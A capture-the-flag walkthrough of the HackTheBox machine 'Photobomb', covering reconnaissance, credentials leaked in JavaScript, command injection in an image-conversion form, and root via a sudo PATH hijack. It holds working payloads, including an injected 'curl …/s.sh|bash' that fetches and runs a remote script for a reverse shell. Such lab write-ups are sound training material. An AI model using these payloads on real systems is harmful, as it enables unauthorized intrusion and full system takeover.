### Photobomb HackTheBox

### Difficulty = Easy

### IP Address = 10.10.11.182

Nmap Scan:

```
# Nmap 7.92 scan initiated Sun Feb 12 21:07:44 2023 as: nmap -sCV -A -p22,80 -oN nmapscan 10.10.11.182
Nmap scan report for 10.10.11.182
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e2:24:73:bb:fb:df:5c:b5:20:b6:68:76:74:8a:b5:8d (RSA)
|   256 04:e3:ac:6e:18:4e:1b:7e:ff:ac:4f:e3:9d:d2:1b:ae (ECDSA)
|_  256 20:e0:5d:8c:ba:71:f0:8c:3a:18:19:f2:40:11:d2:9e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://photobomb.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Feb 12 21:08:05 2023 -- 1 IP address (1 host up) scanned in 20.73 seconds
```

I'll add the domain `photobomb.htb` to my `/etc/hosts` file

```
└─$ cat /etc/hosts | grep htb
10.10.11.182    photobomb.htb 
```

Heading over the web server shows this 
![image](https://user-images.githubusercontent.com/113513376/218334872-d49b49cc-ad85-43bf-b5c1-c34c258d2fa8.png)

Clicking the link shows a login page
![image](https://user-images.githubusercontent.com/113513376/218334906-1763e108-cbdb-45f2-9c4e-61892e705a61.png)

Trying default/weak credentials doesn't work

Checking the source code shows photobomb.js
![image](https://user-images.githubusercontent.com/113513376/218334940-922d5cb0-2983-4a52-af30-047f96daa259.png)
![image](https://user-images.githubusercontent.com/113513376/218334951-b571aa9a-416a-4f59-8acc-59b9809c334d.png)

Reading the source code shows a cred `pH0t0:b0Mb!`
![image](https://user-images.githubusercontent.com/113513376/218335008-b9631dbf-d8af-4e4f-9314-69f6d009daf0.png)

Trying that over the login page works
![image](https://user-images.githubusercontent.com/113513376/218335073-7f16ff1b-1e69-45c2-847c-7e2667dba022.png)
![image](https://user-images.githubusercontent.com/113513376/218335060-2b4f2dc8-9376-4297-a931-de7a277e650d.png)

It converts the image to make it a way it can be printed

Attempting to access a random file throws an error
![image](https://user-images.githubusercontent.com/113513376/218335195-079fe89d-4fd7-4f43-9204-8553f0a74402.png)

Checking google for what sinatra means i got a github source repo
![image](https://user-images.githubusercontent.com/113513376/218335262-fd444975-80f6-4885-9191-dbadaeec55e2.png)

I couldn't get anything from that except that its built in ruby

So i'll analyze the convert function in burp suite
![image](https://user-images.githubusercontent.com/113513376/218335411-63f0a279-8a4d-4ca0-a9dc-ffc76e10be25.png)

After playing with the request i figured that the filetype varaible is vulnerable to command injection

Now i will ping my ip to confirm that it is indeed command injection
![image](https://user-images.githubusercontent.com/113513376/218335566-238171fa-ba8b-453a-bc47-2b11cdb7caff.png)

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 100
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;ping+-c+2+10.10.16.7;&dimensions=3000x2000
```

Back on tcpdump

```
└─$ sudo tcpdump -i tun0 icmp      
[sudo] password for mark: 
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:31:36.240879 IP photobomb.htb > haxor: ICMP echo request, id 2, seq 1, length 64
21:31:36.255021 IP haxor > photobomb.htb: ICMP echo reply, id 2, seq 1, length 64
21:31:37.264825 IP photobomb.htb > haxor: ICMP echo request, id 2, seq 2, length 64
21:31:37.264918 IP haxor > photobomb.htb: ICMP echo reply, id 2, seq 2, length 64
21:31:51.609221 IP photobomb.htb > haxor: ICMP echo request, id 3, seq 1, length 64
21:31:51.609330 IP haxor > photobomb.htb: ICMP echo reply, id 3, seq 1, length 64
21:31:52.632988 IP photobomb.htb > haxor: ICMP echo request, id 3, seq 2, length 64
21:31:52.633053 IP haxor > photobomb.htb: ICMP echo reply, id 3, seq 2, length 64
```

Now i'll get a reverse shell
![image](https://user-images.githubusercontent.com/113513376/218335841-30bfe4c7-0a01-4f0d-99ca-1dad4be050c1.png)

```
POST /printer HTTP/1.1
Host: photobomb.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Origin: http://photobomb.htb
Authorization: Basic cEgwdDA6YjBNYiE=
Connection: close
Referer: http://photobomb.htb/printer
Upgrade-Insecure-Requests: 1
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg;curl+10.10.16.7/s.sh|bash;&dimensions=3000x2000
```

Now i'll stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL +Z
stty raw -echo;fg
```

Only one user available in the box

```
wizard@photobomb:~/photobomb$ id
uid=1000(wizard) gid=1000(wizard) groups=1000(wizard)
wizard@photobomb:~/photobomb$ cd /home
wizard@photobomb:/home$ ls -al
total 12
drwxr-xr-x  3 root   root   4096 Sep 16 15:14 .
drwxr-xr-x 18 root   root   4096 Sep 16 15:14 ..
drwxr-xr-x  7 wizard wizard 4096 Sep 16 15:14 wizard
wizard@photobomb:/home$ cd wizard/
wizard@photobomb:~$ ls -al
total 44
drwxr-xr-x 7 wizard wizard 4096 Sep 16 15:14 .
drwxr-xr-x 3 root   root   4096 Sep 16 15:14 ..
lrwxrwxrwx 1 wizard wizard    9 Mar 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 wizard wizard  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 wizard wizard 3771 Feb 25  2020 .bashrc
drwx------ 2 wizard wizard 4096 Sep 16 15:14 .cache
drwxrwxr-x 4 wizard wizard 4096 Sep 16 15:14 .gem
drwx------ 3 wizard wizard 4096 Sep 16 15:14 .gnupg
drwxrwxr-x 3 wizard wizard 4096 Sep 16 15:14 .local
drwxrwxr-x 6 wizard wizard 4096 Feb 12 20:38 photobomb
-rw-r--r-- 1 wizard wizard  807 Feb 25  2020 .profile
-rw-r----- 1 root   wizard   33 Feb 12 20:02 user.txt
wizard@photobomb:~$ 
```

Lets escalate privilege

Checking sudo permission shows that the user can run a script as root 

```
wizard@photobomb:~$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:~$ 
```

Here's the content of the script

```
wizard@photobomb:~$ ls -l /opt/cleanup.sh
-r-xr-xr-x 1 root root 340 Sep 15 12:11 /opt/cleanup.sh
wizard@photobomb:~$ cat /opt/cleanup.sh
#!/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} \;
wizard@photobomb:~$ 
```

Looking at the script we see the vulnerability that it runs find command without specifying the full path 

We can perform a path hijack and also specify the path the binary should get its command from since SETENV is enabled

Here's the privesc

```
wizard@photobomb:/dev/shm$ nano find
wizard@photobomb:/dev/shm$ chmod +x find
wizard@photobomb:/dev/shm$ cat find
#!/usr/bin/bash

/bin/bash
wizard@photobomb:/dev/shm$ sudo -l
Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
wizard@photobomb:/dev/shm$ sudo PATH=/dev/shm/ /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# 
```

And we're done

<br> <br>
[Back To Home](../../index.md)

